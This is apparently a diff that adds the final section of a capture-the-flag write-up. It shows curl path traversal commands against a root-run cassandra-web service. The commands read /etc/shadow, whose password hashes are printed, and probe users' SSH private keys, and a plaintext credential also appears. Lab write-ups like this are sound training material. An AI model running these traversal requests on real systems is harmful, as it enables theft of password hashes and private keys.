@@ -140,4 +140,60 @@ Let’s try.
 sudo -u root /usr/local/bin/cassandra-web -B 0.0.0.0:1337 -u cassie -p SecondBiteTheApple330
 ```
 
+![](Images/Clue23.png)
+Okay, let’s see if we can indeed access it. The server is running on 0.0.0.0:9999 but I can’t access it from my Kali machine.
+![](Images/Clue24.png)
+It is indeed hosted, and it turns out we can only access it from within the machine.
+![](Images/Clue25.png)
+I tried opening a python server then transfer the exploit to the target machine, but it wasn’t working for some reason. But after reading the exploit, it’s pretty easy to replicate.
+![](Images/Clue26.png)
+So it’s just the url + a huge amount of ‘../’, so we can replicate it by doing a GET request using curl. We can achieve it by something like :
+```sh 
+curl --path-as-is http://0.0.0.0:1337/../../../../../../../../etc/shadow
+```
+### ✅ `--path-as-is`
 
+**Important flag.**
+
+Normally, curl **normalizes URLs**:
+
+- Removes `../`
+- Cleand up paths
+-Example:
+
+/../../etc/passwd → /etc/passwd
+
+That would defeat the exploit.
+
+👉 `--path-as-is` tells curl:
+
+> ❗ "Send the path EXACTLY as written — do NOT normalize it."
+
+Without this flag, the traversal attack might fail.
+
+![](Images/Clue27.png)
+Indeed. Now we can read stuff as root.
+```sh
+root:$6$kuXiAC8PIOY2uis9$LrTzlkYSlY485ZREBLW5iPSpNxamM38BL85BPmaIAWp05VlV.tdq0EryiFLbLryvbsGTx50dLnMsxIk7PJB5P1:19209:0:99999:7:::  
+cassie:$6$/WeFDwP1CNIN34/z$9woKSLSZhgHw1mX3ou90wnR.i5LHEfeyfHbxu7nYmaZILVrbhHrSeHNGqV0WesuQWGIL7DHEwHKOLK6UX79DI0:19209:0:99999:7:::  
+anthony:$6$01NV0gAhVLOnUHb0$byLv3N95fqVvhut9rbsrYOVzi8QseWfkFl7.VDQ.26a.0IkEVR2TDXoTv/KCMLjUOQZMMpkTUdC3WIyqSWQ.Y1:19209:0:99999:7::
+```
+Let’s try to see if root have id_rsa.
+```sh
+ curl --path-as-is http://0.0.0.0:1337/../../../../../../../../root/.ssh/id_rsa
+```
+
+![](Images/Clue28.png)
+Nothing.
+We'll look for anthony.
+```sh
+curl --path-as-is http://0.0.0.0:1337/../../../../../../../../../home/anthony/.ssh/id_rsa
+```
+
+![](Images/Clue29.png)
+Anthony have id_rsa.
+We can’t even SSH using it to anthony. BUT WE CAN DO IT AS ROOT. WTF is this machine.
+We simply copy it and made a new file named `id_rsa`.
+![](Images/Clue30.png)
+We got the flags.
+![](Images/Clue31.png)
